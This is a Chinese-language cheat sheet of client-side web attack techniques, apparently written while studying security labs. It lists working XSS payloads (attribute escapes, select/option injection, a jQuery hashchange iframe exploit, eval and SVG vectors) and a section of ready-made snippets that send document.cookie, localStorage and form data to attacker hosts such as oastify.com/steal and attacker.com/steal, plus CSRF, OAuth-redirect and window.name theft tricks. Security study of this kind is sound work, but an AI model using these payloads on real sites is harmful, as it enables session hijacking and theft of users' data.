# 客户端

```js
`!"#$%&'()*+,-./:;<=>?@[]^_`{}|~\\
```

## 浏览器自动补全探索

上下文 `<img src="/resources/images/tracker.gif?searchTerms=` 属性值逃逸
- 载荷
    `"'><img src onerror=alert(1)>`
- 浏览器 JS 构造后
    ```html
    <img src="/resources/images/tracker.gif?searchTerms=" '="">
    <img src="" onerror="alert(1)">
    "&gt;
    ```
    - 单双引号逃逸
        - 冗余 `'` 很有趣，似乎被视为属性，并在之后添加空属性字符
    - `src` 自动修复为 `src=""`
    - `alert(1)` 自动修复为 `"alert(1)"`
    - 原末尾 `">` 仅被视为文本字符


## select option 元素作为上下文时无需逃逸即执行所有 JS 载荷

探测
```js
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if(store) {
    document.write('<option selected>'+store+'</option>');
}
```
- 源 `window.location.search`
- 汇 `document.write`
- 若搜索段存在字段 `storeId`，则将此内容加入 `select` 列表中

攻击
- 载荷 `<svg onload=alert()>` 
    ```http
    GET /product?productId=1&storeId=%3Csvg+onload%3dalert()%3E HTTP/2
    ```
    - 浏览器渲染
        ```html
        <select name="storeId">
            <option selected=""><svg onload="alert()"></svg></option>
            <option>London</option>
            <option>Paris</option>
            <option>Milan</option>
        </select>        
        ```
        - 成功弹窗
- 载荷 `<img src onerror=alert()>` 成功弹窗
- 载荷 `<script>alert()</script>` 成功弹窗
- 普通载荷即在 `select option` 标签内触发 JS 代码执行，而无需关闭上下文标签

## jQuery `$()` 同时作为选择器与解释器，顶级页面可修改子框架 src 属性而不受同源策略访问子框架 DOM 的限制

[`$()` 不仅作为元素选择器，还作为 HTML 解释器来创建元素](https://bugs.jquery.com/ticket/11290/) 


```javascript
$(window).on('hashchange', function() { // 触发事件
    // 脆弱代码，源 location.hash，汇 $()
	var element = $(location.hash); 
	element[0].scrollIntoView();
});
```
- 触发事件 `hashchange`
- 源 `window.location.hash`
- 汇 `$()`

通过 `iframe`，无需用户交互即可触发 `hashchange` 事件：

```html
<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'"></iframe>
```

在此示例中
1. 子框架的 `src` 属性指向带有空哈希值的易受攻击页面
2. 当顶级页面的 `iframe` 加载时，顶级页面的 `onload` 事件触发：
    - XSS 向量被附加到子框架 `src` 属性的 URL 的哈希片段中
3. 子框架重载更新后的 URL，子框架内：
    1. 触发 `hashchange` 事件。
    2. 载荷由源 `location.hash` 进入汇 `$()`，导致 JS 执行

此处攻击者控制的顶级页面修改子框架元素的 src 属性，而无关同源策略中访问子框架 DOM 的限制

较新版本的 jQuery 已通过阻止在输入以哈希字符（`#`）**开头**时向选择/创建器注入 HTML 来修补此特定漏洞。

> **注意：** 即使更新版本的 jQuery，只要您能完全控制来自不需要 `#` 前缀的源的输入，仍可能通过 `$()` 选择器汇受到攻击。

## eval 字符串上下文

```log
;alert()//
-alert()//
+alert()//
&&alert()//
==alert()//
|alert()//
in alert()//
instanceof alert()//
```
- 语句分隔符
- 二元运算符
    - 加减乘除幂模
    - 逻辑表达式
    - 位运算
- 功能运算符
    - `in`
    - `instanceof`

## svg

速查表示例载荷
`<svg><animate xlink:href=#xss attributeName=href values=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>`

- `attributeName` 修改的属性名
- `values` 修改的属性值
- 对 `xlink:href` 查阅 [MDN 文档](https://developer.mozilla.org/en-US/docs/Web/SVG/Reference/Attribute/xlink:href#animate_animatemotion_animatetransform_set)
    > 如果未提供 xlink:href 属性，则目标元素将是当前动画元素的直接父元素。
    - 此处 animate 与 a 并列后使用 `xlink:href` 指定目标元素
    - 设置 a 为 animate 的父元素即可默认指定父元素而省略此属性

a 作为 animate 的父元素
`<svg><a><animate attributeName=href values=javascript:alert() /><text x=20 y=20>Click me</text></a>`
    
- `animate` 未指定 `xlink:href` 于是默认修改父元素


SVG 动画标签 `<animateTransform attributeName="transform">` 在其目标元素上为变换属性做动画
- 可设置事件监听器如 `onbegin`

## CSP

- `script-src 'self'` 仅允许同源 JS 脚本文件，禁止脚本标签与事件监听器

## 收发数据

### XHR

```js
var req = new XMLHttpRequest();
req.onload = 回调函数; // 设置回调函数
req.open('get', '/foo', true); // 设置方法、端点、异步
req.send(); // 发送

function 回调函数(){
    // 方式1：从响应体中提取数据
    let value_reg = this.responseText.match(/正则表达式/)[1];

    // 方式2：解析为 DOM，之后使用 .getAttribute(属性)
    let response_dom = new DOMParser().parseFromString(this.responseText, "text/html");
    let value_dom = response_dom.querySelector(元素查询字符串);
}
```
- `open(method, url, async, user, password)`

### fetch

```js
fetch('/foo', {credentials: "include"})
    .then(response => response.text())
    .then(text => text.match(/正则表达式/)[1])
    .catch(err => console.log('Request Failed', err)); 
```

## 带外信息

### 发送数据

页面的 HTTP(S) 状态与端点方法需一致

- XMLHttpRequest
    - GET
        ```js
        {
            let xhr = new XMLHttpRequest();

            xhr.open("GET", "https://oastify.com/steal?cookie=" + document.cookie, true);

            xhr.send();
        }
        ```

    - POST
        ```js
        {
            let xhr = new XMLHttpRequest();
            xhr.open("POST", "https://oastify.com/steal", true);

            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

            xhr.send("cookie=" + document.cookie);
        }
        ```

- fetch 
    - GET
        ```js
        fetch("https://oastify.com/steal?cookie=" + document.cookie, {mode: 'no-cors'});
        ```

    - POST 
        ```js
        // URLSearchParams
        fetch("https://oastify.com/steal", {
            method: "POST",
            // 禁用跨域请求模式：不“读取”监听服务器的响应，不发送 OPTIONS 预检请求，而直接发送当前请求
            mode: 'no-cors', 
            headers: {
                "Content-Type": "application/x-www-form-urlencoded",
            },
            body: new URLSearchParams({
                "cookie": document.cookie,
            })
        });
        ```
        - JSON
            - 头部
                `"Content-Type": "application/json"`
            - 数据
                `JSON.stringify({名:值})`

- `navigator.sendBeacon()` POST
    ```js
    // 字典
    navigator.sendBeacon("https://attacker.com/steal",
        new URLSearchParams({
            "cookie": document.cookie,
            "url": window.location.href
        })
    );
    ```
    - 列表
        ```js
        new URLSearchParams([
                ["cookie", document.cookie],
                ["url", window.location.href]
            ])   
        ```
        - 二维数组的项似乎被视为名值对

[简单请求](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS)
- 若非简单请求，则触发预检

其他
- 表单自动提交
- `WebSocket` 连接

### HTML 资源标签 URL GET

- 构造函数创建 HTML 元素
    ```js
    new Image().src = "https://oastify.com/steal?cookie=" + encodeURIComponent(document.cookie);
    ```

- document 对象创建并添加元素
    ```js
    {
        let s = document.createElement('script');
        s.src = "https://oastify.com/steal?data=" + encodeURIComponent(JSON.stringify({
            cookie: document.cookie,
            local: localStorage
        }));
        document.body.appendChild(s);   
    }
    ```

### 跳转 GET

```js
document.location = "https://oastify.com/steal?cookie=" + document.cookie; 
```

## 时间延迟

```js
setTimeout(() => {
    console.log("2 秒后执行回调函数");
}, 2000);   
```

```js
// 页面加载完成时
document.addEventListener('DOMContentLoaded', function() {
    launch_attack();
});
```

## 表单

```js
// 选取表单元素
let form_ele = document.querySelector('form');
// 将表单元素转为表单数据对象
let form_data_obj = new FormData(form_ele);

// 若添加字段
form_data_obj.append("foo", "bar");

// 将表单数据对象转为搜索名值对字符串，可直接在 GET 中发送
let form_params = new URLSearchParams(form_data_obj);
fetch("https://oastify.com/steal?" + form_params, {mode: 'no-cors'});


// 或将表单数据对象使用 POST 直接以 form-data 格式发送，自动设置表单类型头部
fetch("https://oastify.com/steal", {
    method: "POST",
    mode: 'no-cors', 
    body: form_data_obj
});
```

input 元素 value 值变化事件
- `onchange`
- `oninput`

选择表单
- `document.forms[0]`
- `document.querySelector('form')`

表单提交时定向到目标域名 
- `<form action=目标域名`
- `<button formaction=目标域名`

表单提交方法
- `<form method="GET"`
- `<button formmethod="GET"`

```html
<input type="submit" form="form_id" value="点我a">
<button form="form_id">点我b</button>

<form id="form_id">
```
- 位置无关的表单控件与表单元素（form 元素的 DOM 外）
    - 表单元素设置 `id`，表单控件设置 `form` 属性值为对应 `id` 以关联表单元素，从而将表单空间放置在任意位置

表单地址为当前页面
- 不设置 `action` 属性
- 设置空字符串 `action=""` 

设置内容类型
```html
<form enctype="multipart/form-data">
```

## oauth

oauth 身份验证为一系列在应用程序与验证服务器之间的设置状态的重定向操作
- → 当受害者已登录时，从攻击者页面顶级导航到应用程序的 oauth 登录端点
    - 虽然顶级导航的目标并非当前步骤，而是创建之后步骤的顶级导航上下文
- ← 应用程序返回的页面包含对 oauth 服务器的客户端重定向，以及验证参数
- → 浏览器访问 oauth 服务器时携带之前通过验证的 oauth 服务器的 cookie
    - 当前步骤为顶级导航上下文的实际使用步骤，需在 get 中携带 cookie
- ← oauth 服务器使用服务器端重定向到应用程序的回调端点，快速返回保存的会话状态而不再重新验证
- → 浏览器使用回调参数密钥访问应用程序的回调端点
- ← 应用程序设置新 cookie

此处的关键在于浏览器保存着 oauth 服务器中的已通过验证的 cookie（顶级导航），应用程序的 cookie 在此场景下无关（是否存在，是否被发送）。应用程序的回调端点仅使用 url 的查询参数密钥进行确认

## 其他

- 注入的 `<body>` 虽然标签被浏览器去掉而不显示在 DOM 中，但实际上载荷仍可执行，似乎合并到原始 body 中
- 顶级页面可修改跨域子框架的部分内容而不受同源策略对 DOM 访问的限制
    - 大小，子框架作为顶级页面的元素可被修改大小
    - 链接，顶级页面修改子框架 src 属性后，子框架重载 URL。若顶级页面修改片段值，则可触发 hash 变化与聚焦

- XSS 的方式
    - 单 URL 链接
    - 攻击者页面加载目标页面为子框架

- 组合使用快捷键属性 `accesskey="X"`、点击事件 `onclick="alert(1)"` 
    (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)

- 浏览器解析顺序
    1. 标签 属性 `<>`
    2. 属性值 HTML 解码 `&;`
    3. JS 字符串的 Unicode 解码 `\u0027`
        - 此时虽然字符还原，但无法逃逸出字符串

- HTML 元素设置 id 
    - id 为字符串时，使用 `window[设置id]` 访问
    - id 为全局变量，使用 `window.id` 或 `id` 访问

`target` 属性
- 设置打开/提交链接的位置（上下文） `<a>` `<form>` 同时更新 `window.name`
    - `<iframe>` 的 name（用于 CSRF 隐藏表单导航操作）
    - 关键字 
        - `_blank` 新标签页
        - `_self` 默认，当前上下文
        - `_parent`
        - `_top`
        - `_unfencedTop`
- 若值不对应组件或关键字：打开新标签页，并使用值设置 `window.name` 而用于悬空窃取

- `pushState(state, unused, url)`
    将一个条目添加到浏览器的会话历史记录堆栈中。
    - `url` 
        设置浏览器窗口显示的 url 为此参数，并设置到历史记录中。但不立即加载此 url

- URL 重定向
    - 在末尾添加 `/` 或导致服务器端重定向到去除此反斜杠
        - `foo/bar/` => `foo/bar`

- 客户端路径遍历
    - `window.location = '/blog/' + 拼接内容对象`
        - 此时拼接内容若设置遍历序列 `../../` 将被浏览器进行规范化，突破客户端 JS 代码的固定路径限制。可用于客户端重定向

- `window.open()`打开新窗口需手动交互
